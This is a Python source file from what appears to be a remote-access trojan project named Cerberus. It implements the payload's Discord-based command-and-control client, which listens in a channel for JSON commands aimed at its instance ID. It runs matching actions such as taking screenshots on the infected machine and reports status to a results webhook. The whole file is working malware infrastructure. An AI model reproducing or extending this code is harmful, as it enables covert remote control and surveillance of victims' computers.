# F:/Cerebus/live_payload_components/payload_discord_client.py
import discord
import asyncio
import threading
import json
import traceback

# These will be imported from the main generated payload script's scope
# or passed during initialization.
# from . import payload_actions # Relative import if this is a package
# For now, assume payload_actions functions will be available in the global scope
# or passed to a class.

# Globals for the payload's bot client
_payload_bot_token = None
_payload_command_channel_id = None
_payload_instance_id = None
_payload_actions_module = None # To hold the imported payload_actions

_payload_client = None
_payload_loop = None
_payload_thread = None
_stop_event = threading.Event() # Used to signal the bot thread to stop

def _start_payload_bot_loop(loop):
    """Internal: Runs the asyncio event loop for the payload's bot client."""
    asyncio.set_event_loop(loop)
    try:
        loop.run_forever()
    except KeyboardInterrupt: # Or other shutdown signals
        print("[Payload Bot] Loop interrupted.")
    finally:
        print("[Payload Bot] Loop closing...")
        # Gracefully cancel all pending tasks
        tasks = asyncio.all_tasks(loop=loop)
        for task in tasks:
            task.cancel()
        # Ensure loop is not run again until completed if tasks were cancelled
        # loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
        loop.close()
        print("[Payload Bot] Loop closed.")

async def _run_payload_discord_bot():
    """The main async function that runs the payload's Discord bot client."""
    global _payload_client, _payload_bot_token, _payload_command_channel_id
    global _payload_instance_id, _payload_actions_module, _stop_event

    if not all([_payload_bot_token, _payload_command_channel_id, _payload_instance_id, _payload_actions_module]):
        print("[Payload Bot] CRITICAL: Bot token, channel ID, instance ID, or actions module not set. Cannot start.")
        return

    intents = discord.Intents.default()
    intents.messages = True  # Need to read messages
    intents.message_content = True # REQUIRED to read message content after Aug 2022 changes
    
    _payload_client = discord.Client(loop=_payload_loop, intents=intents)

    @_payload_client.event
    async def on_ready():
        print(f"[Payload Bot] Logged in as {_payload_client.user} (ID: {_payload_client.user.id})")
        print(f"[Payload Bot] Instance ID: {_payload_instance_id}")
        print(f"[Payload Bot] Listening for commands in channel ID: {_payload_command_channel_id}")
        # Optionally send a "bot online" status to results webhook here
        try:
            _payload_actions_module._send_action_status( # type: ignore
                "Payload Bot Online", 
                "Connected and Listening", 
                f"Instance ID: {_payload_instance_id}\nPython: {platform.python_version()}",
                color=0x00BFFF # Deep Sky Blue
            )
        except Exception as e:
            print(f"[Payload Bot] Error sending 'Online' status: {e}")


    @_payload_client.event
    async def on_message(message):
        global _payload_instance_id, _payload_command_channel_id, _payload_actions_module
        
        if message.author == _payload_client.user: # Ignore messages from self
            return
        if str(message.channel.id) != _payload_command_channel_id: # Ignore messages not in our command channel
            return

        print(f"[Payload Bot] Received message in command channel: {message.content[:100]}")

        try:
            command_data = json.loads(message.content)
            target_id = command_data.get("target_id")
            action = command_data.get("action")
            args_str = command_data.get("args", "") # args is a string from builder

            # Check if the command is for this payload instance
            # For now, require an exact match. Later could do prefix matching.
            if target_id == _payload_instance_id:
                print(f"[Payload Bot] Command for this instance (ID: {_payload_instance_id})! Action: {action}")

                action_func_name = action.lower().replace(" ", "_") # e.g., "Take Screenshot" -> "take_screenshot"
                
                if hasattr(_payload_actions_module, action_func_name):
                    action_method = getattr(_payload_actions_module, action_func_name)
                    
                    # Execute the action. Handle arguments based on action.
                    # This is a simplified direct call. A more robust system might use a task queue.
                    if action_func_name in ["show_message_box"]: 
                        # Assume args_str is "title;text" or just "text"
                        # For simplicity, if we need multiple args, we might need better parsing or structure in 'args'
                        # For show_message_box, let's assume args_str is the text, and use a default title.
                        # Or, if args_str contains a delimiter like ';', split it.
                        # For now, the builder only sends one 'args' string.
                        # Let's assume the `args` field from JSON is the primary argument.
                        # For show_message_box, it's the message text.
                        # The builder's "Argument(s)" field maps directly to `args_str`.
                        if action_func_name == "show_message_box":
                            # Example: "Hello from GUI" -> title="Cerberus Command", text="Hello from GUI"
                            # Or builder could send JSON in args: {"title": "t", "text": "msg"}
                            # For now, let's keep it simple: args_str is the message text.
                            # title can be a default or derived.
                            custom_title = f"Command: {action}"
                            action_method(title=custom_title, text=args_str)
                        # Add elif for other actions needing specific arg parsing/passing
                        # elif action_func_name == "change_wallpaper":
                        #    action_method(image_url=args_str)
                        else: # For actions like take_screenshot that take no args from command
                              # or actions where args_str is the single direct argument.
                            action_method() # Assumes take_screenshot takes no args from command
                    else:
                        # For actions like take_screenshot which don't expect command-line args from the builder
                        # Or, if an action *does* take one string arg, it's `args_str`
                        # This needs to be more sophisticated based on action definitions.
                        # For now, a simple approach:
                        if action_func_name == "take_screenshot":
                            action_method() # Defined in payload_actions to take no args
                        # elif action_func_name == "some_action_with_one_arg":
                        #     action_method(args_str)
                        else:
                            print(f"[Payload Bot] Action '{action}' called without specific argument handling pattern. Calling with no explicit args.")
                            # This is a fallback - ideally, each action has its arg needs defined.
                            # For now, if it's not show_message_box, and it's not take_screenshot, we'll try calling it with no args.
                            # This part needs refinement based on how args are structured for each action.
                            # Let's assume 'take_screenshot' takes no args.
                            # For other one-arg actions, we might pass args_str.
                            # The example only has show_message_box (takes text) and take_screenshot (takes no text from command).
                            
                            # A better way for actions taking one direct arg:
                            if hasattr(action_method, "__code__") and action_method.__code__.co_argcount > 0:
                                # This is a very basic check, not foolproof for complex signatures
                                print(f"[Payload Bot] Action '{action_func_name}' seems to take arguments. Passing: '{args_str}'")
                                action_method(args_str) 
                            else:
                                action_method()


                else:
                    print(f"[Payload Bot] Unknown action: {action} (method {action_func_name} not found in payload_actions)")
                    _payload_actions_module._send_action_status(action, "Error", f"Unknown action command received: {action}", color=0xFF0000) # type: ignore
            # else:
            #     print(f"[Payload Bot] Command target_id '{target_id}' does not match my ID '{_payload_instance_id}'. Ignoring.")

        except json.JSONDecodeError:
            print(f"[Payload Bot] Received non-JSON message or malformed JSON: {message.content[:100]}")
        except Exception as e:
            print(f"[Payload Bot] Error processing message: {e}\n{traceback.format_exc()}")
            # Optionally send an error back to results webhook
            try:
                _payload_actions_module._send_action_status("Command Processing Error", "Error", f"Failed to process command: {e}", color=0xFF0000) # type: ignore
            except: pass


    try:
        print("[Payload Bot] Starting bot client...")
        await _payload_client.start(_payload_bot_token)
    except discord.LoginFailure:
        print("[Payload Bot] CRITICAL: Login failed for payload bot. Check token.")
    except Exception as e:
        print(f"[Payload Bot] CRITICAL: Error starting payload bot: {e}\n{traceback.format_exc()}")
    finally:
        print("[Payload Bot] Client execution finished or stopped.")
        if _payload_client and not _payload_client.is_closed():
            await _payload_client.close()
        print("[Payload Bot] Payload bot client closed.")


def start_payload_bot_thread(bot_token, command_channel_id, instance_id, actions_module_ref, results_webhook_url):
    """Starts the payload's Discord bot in a new thread."""
    global _payload_bot_token, _payload_command_channel_id, _payload_instance_id
    global _payload_loop, _payload_thread, _stop_event, _payload_actions_module

    _payload_bot_token = bot_token
    _payload_command_channel_id = command_channel_id
    _payload_instance_id = instance_id
    _payload_actions_module = actions_module_ref
    
    # Set the global RESULTS_WEBHOOK_URL and PAYLOAD_INSTANCE_ID in the actions_module
    if hasattr(actions_module_ref, 'RESULTS_WEBHOOK_URL'):
        actions_module_ref.RESULTS_WEBHOOK_URL = results_webhook_url
    if hasattr(actions_module_ref, 'PAYLOAD_INSTANCE_ID'):
        actions_module_ref.PAYLOAD_INSTANCE_ID = instance_id


    if _payload_thread and _payload_thread.is_alive():
        print("[Payload Bot] Bot thread already running.")
        return

    _stop_event.clear()
    _payload_loop = asyncio.new_event_loop()
    
    _payload_thread = threading.Thread(target=_start_payload_bot_loop, args=(_payload_loop,), daemon=True)
    _payload_thread.name = "PayloadDiscordListenThread"
    _payload_thread.start()

    asyncio.run_coroutine_threadsafe(_run_payload_discord_bot(), _payload_loop)
    print("[Payload Bot] Bot thread started and bot run scheduled.")

def stop_payload_bot_thread():
    """Stops the payload's Discord bot and its thread."""
    global _payload_loop, _payload_thread, _stop_event, _payload_client

    _stop_event.set() # Signal to stop any loops that might be checking it

    if _payload_loop and _payload_client and not _payload_client.is_closed():
        print("[Payload Bot] Requesting bot client to close...")
        asyncio.run_coroutine_threadsafe(_payload_client.close(), _payload_loop)
        # Give it a moment to process the close
        # For a more robust shutdown, the main loop in _run_payload_discord_bot
        # could periodically check _stop_event.

    if _payload_loop and _payload_loop.is_running():
        print("[Payload Bot] Requesting event loop to stop...")
        _payload_loop.call_soon_threadsafe(_payload_loop.stop)

    if _payload_thread and _payload_thread.is_alive():
        print("[Payload Bot] Waiting for bot thread to join...")
        _payload_thread.join(timeout=10) # Wait for thread to finish
        if _payload_thread.is_alive():
            print("[Payload Bot] Bot thread did not terminate gracefully.")
    
    _payload_client = None
    _payload_loop = None
    _payload_thread = None
    print("[Payload Bot] Payload bot thread shutdown sequence complete.")

# Need platform for actions module
import platform 